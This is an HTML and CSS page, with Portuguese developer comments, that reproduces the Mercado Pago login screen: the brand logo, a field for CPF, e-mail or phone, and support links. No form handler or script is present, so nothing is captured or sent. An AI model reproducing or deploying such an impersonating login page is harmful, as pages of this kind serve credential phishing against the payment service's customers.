<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Pago</title>
    <style>
        /* Reset básico */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            /* ADICIONADO: Cor de fundo para a página inteira */
            background-color: #f5f5f5; 
        }

        /* Estilo do cabeçalho principal (INTOCADO) */
        .main-header {
            background-color: #ffe600;
            padding: 0 680px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }

        .main-header img {
            height: 37px;
            vertical-align: middle;
        }
        
        /* --- ESTILOS DO CONTEÚDO PRINCIPAL --- */
        .main-content {
            display: flex;
            justify-content: center; 
            align-items: flex-start; 
            padding-top: 80px; 
            gap: 64px;
            /* ADICIONADO: Faz o conteúdo principal crescer e empurrar o rodapé para baixo */
            flex-grow: 1;
        }
        
        .left-column {
            display: flex;
            flex-direction: column;
            flex-basis: 320px;
            flex-shrink: 0;
        }

        /* Título principal */
        .main-title {
            font-size: 26px;
            font-weight: 600;
            color: #333;
            line-height: 1.25;
            text-align: left;
            margin: 0; 
        }
        
        .form-card {
            width: 80%;
            max-width: 500px;
            background-color: #fff;
            box-shadow: 0 2px 6px 0 rgba(0,0,0,.1);
            border-radius: 6px;
            padding: 48px;
            box-sizing: border-box;
        }

        /* Links de suporte */
        .security-link {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 10px;
            padding: 14px 16px;
            text-decoration: none;
            color: #333;
            font-size: 14px;
            font-weight: 500;
            transition: box-shadow 0.2s;
            box-sizing: border-box;
            margin-top: 200px; 
        }
        .security-link:hover { box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); }
        .security-link .icon-text { display: flex; align-items: center; gap: 12px; }
        .help-link { display: block; margin-top: 16px; color: #3483fa; text-decoration: none; font-size: 14px; font-weight: 400; }
        .help-link:hover { text-decoration: underline; }
        
        /* Outros estilos do formulário */
        .input-label { font-size: 14px; color: #555; margin-bottom: 4px; display: block; font-weight: 400; }
        .input-field { width: 100%; padding: 16px; font-size: 16px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        .input-field:focus { outline: 1px solid #3483fa; border-color: #3483fa; }
        .actions { margin-top: 24px; display: flex; align-items: center; gap: 24px; }
        .btn-continue { background-color: #3483fa; color: white; border: none; padding: 16px 24px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; }
        .btn-continue:hover { background-color: #2968c8; }
        .link-create { color: #3483fa; font-size: 15px; font-weight: 500; text-decoration: none; }
        .link-create:hover { text-decoration: underline; }

        /* --- NOVO: ESTILOS DO RODAPÉ --- */
        .main-footer {
            background-color: #ededed;
            padding: 24px 48px;
            font-size: 12px;
            color: #666;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .footer-left, .footer-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .main-footer a {
            color: #3483fa;
            text-decoration: none;
        }
        .main-footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="left-column">
            <h1 class="main-title">Digite seu CPF, e-mail ou<br>telefone para iniciar sessão</h1>
            <a href="#" class="security-link">
                <span class="icon-text">
                    <svg xmlns="http://www.w3.org/2000/svg" width="27" height="26" fill="none" aria-hidden="true"><path fill="#000" fill-opacity="0.9" fill-rule="evenodd" d="M11.715 25.15C3.915 22.55 0 16.02 0 5.791V4.87h.924c3.462 0 6.955-1.448 10.494-4.38l.59-.489.589.488a23.955 23.955 0 002.914 2.087l-1.684 1.122a25.984 25.984 0 01-1.82-1.31C8.655 5.022 5.27 6.463 1.857 6.686c.212 8.828 3.585 14.298 10.15 16.61 2.287-.805 4.186-1.993 5.699-3.572h2.43c-1.909 2.506-4.522 4.32-7.837 5.425l-.292.098-.292-.098z" clip-rule="evenodd"></path><path fill="#000" fill-opacity="0.9" fill-rule="evenodd" d="M19.505 4.734a5.917 5.917 0 00-5.4 8.34l.25.556-.19.58-.888 2.722 2.978-.85.523-.15.504.205a5.917 5.917 0 102.223-11.403zM12.01 10.65a7.495 7.495 0 114.678 6.948l-4.678 1.336-.79-.79 1.445-4.425a7.468 7.468 0 01-.655-3.07z" clip-rule="evenodd"></path><path fill="#000" fill-opacity="0.9" d="M20.27 7.4h-1.53l.192 4.207h1.147l.192-4.208zm-.764 4.972a.765.765 0 110 1.53.765.765 0 010-1.53z"></path></svg>
                    <span>Tenho um problema de segurança</span>
                </span>
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#8e9194ff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
            </a>
            <a href="#" class="help-link">Preciso de ajuda</a>
        </div>
        <div class="form-card">
            <form id="login-form">
                <div>
                    <label for="identificador" class="input-label">CPF, e-mail ou telefone</label>
                    <input type="text" id="identificador" class="input-field">
                </div>
                <div class="actions">
                    <button type="submit" class="btn-continue">Continuar</button>
                    <a href="#" class="link-create">Criar conta</a>
                </div>
            </form>
        </div>
    </main>

    <footer class="main-footer">
        <div class="footer-left">
            <a href="#">Como cuidamos da sua privacidade</a>
            <span>Copyright © 1999-2025 Elocom.com LTDA.</span>
        </div>
        <div class="footer-right">
            <span>Protegido por reCAPTCHA -</span>
            <a href="#">Privacidade</a>
            <a href="#">Condições</a>
        </div>
    </footer>

</body>
</html>